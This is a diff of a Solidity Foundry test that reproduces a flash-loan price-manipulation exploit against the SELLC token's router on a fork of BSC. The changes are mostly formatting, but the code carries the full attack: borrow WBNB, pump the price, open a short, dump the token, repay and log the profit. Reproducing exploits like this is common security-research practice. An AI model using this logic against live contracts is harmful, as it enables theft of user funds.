@@ -11,11 +11,21 @@ import "./interface.sol";
 // @Summary
 // Just use `getAmountOut` as token price
 
+
+/*interface IDPPOracle {
+    function flashLoan(
+        uint256 baseAmount,
+        uint256 quoteAmount,
+        address _assetTo,
+        bytes calldata data
+    ) external;
+}*/
+
 interface ISellTokenRouter {
-    function ShortStart(address coin, address addr, uint256 terrace) external payable;
+    function ShortStart(address coin,address addr,uint terrace) payable external;
     function withdraw(address token) external;
     function setTokenPrice(address _token) external;
-    function getToken2Price(address token, address bnbOrUsdt, uint256 bnb) external returns (uint256);
+    function getToken2Price(address token,address bnbOrUsdt,uint bnb) external returns(uint);
 }
 
 contract SellTokenExp is Test, IDODOCallee {
@@ -27,7 +37,7 @@ contract SellTokenExp is Test, IDODOCallee {
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() public {
-        cheats.createSelectFork("bsc", 28_168_034);
+        cheats.createSelectFork("bsc", 28168034);
         deal(address(wbnb), address(this), 10 ether);
         payable(0x0).transfer(address(this).balance);
     }
@@ -39,16 +49,23 @@ contract SellTokenExp is Test, IDODOCallee {
         oracle1.flashLoan(wbnb.balanceOf(address(oracle1)), 0, address(this), bytes("abc"));
 
         emit log_named_decimal_uint("WBNB total profit", wbnb.balanceOf(address(this)) - 10 ether, 18);
+
     }
 
-    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
-        uint256 balance = wbnb.balanceOf(address(this));
+    function DPPFlashLoanCall(
+        address sender,
+        uint256 baseAmount,
+        uint256 quoteAmount,
+        bytes calldata data
+    ) external {
+
+        uint balance = wbnb.balanceOf(address(this));
         if (data.length > 20) {
             balance -= 10 ether;
         }
         //emit log_named_decimal_uint("WBNB before", wbnb.balanceOf(address(this)), 18);
-        uint256 swap_balance = balance * 99 / 100;
-        uint256 short_balance = balance - swap_balance;
+        uint swap_balance = balance * 99 / 100;
+        uint short_balance = balance - swap_balance;
         wbnb.withdraw(short_balance);
         // 1. lift price
         address[] memory path = new address[](2);
@@ -57,7 +74,13 @@ contract SellTokenExp is Test, IDODOCallee {
         wbnb.approve(address(p_router), type(uint256).max);
         SELLC.approve(address(p_router), type(uint256).max);
         //emit log_named_decimal_uint("SELLC price before", s_router.getToken2Price(address(SELLC), address(wbnb), 1 ether), 18);
-        p_router.swapExactTokensForTokens(swap_balance, 0, path, address(this), block.timestamp + 1000);
+        p_router.swapExactTokensForTokens(
+            swap_balance,
+            0,
+            path,
+            address(this),
+            block.timestamp + 1000
+        );
         //emit log_named_decimal_uint("swap_balance:  ", s_router.getToken2Price(address(SELLC), address(wbnb), 1 ether), 18);
 
         // 2. short SELLC
@@ -69,11 +92,17 @@ contract SellTokenExp is Test, IDODOCallee {
             s_router.ShortStart{value: address(this).balance}(address(SELLC), address(this), 1);
         }
 
+
+
         // 3. drop price
         path[0] = address(SELLC);
         path[1] = address(wbnb);
         p_router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            SELLC.balanceOf(address(this)), 0, path, address(this), block.timestamp + 1000
+            SELLC.balanceOf(address(this)),
+            0,
+            path,
+            address(this),
+            block.timestamp + 1000
         );
         //emit log_named_decimal_uint("WBNB after", wbnb.balanceOf(address(this)), 18);
         //emit log_named_decimal_uint("SELLC price after", s_router.getToken2Price(address(SELLC), address(wbnb), 1 ether), 18);
@@ -88,7 +117,14 @@ contract SellTokenExp is Test, IDODOCallee {
             wbnb.transfer(address(oracle1), balance);
             emit log_named_decimal_uint("WBNB cost first", 10 ether - wbnb.balanceOf(address(this)), 18);
         }
+
+
+
+
     }
 
     receive() external payable {}
+
 }
+
+
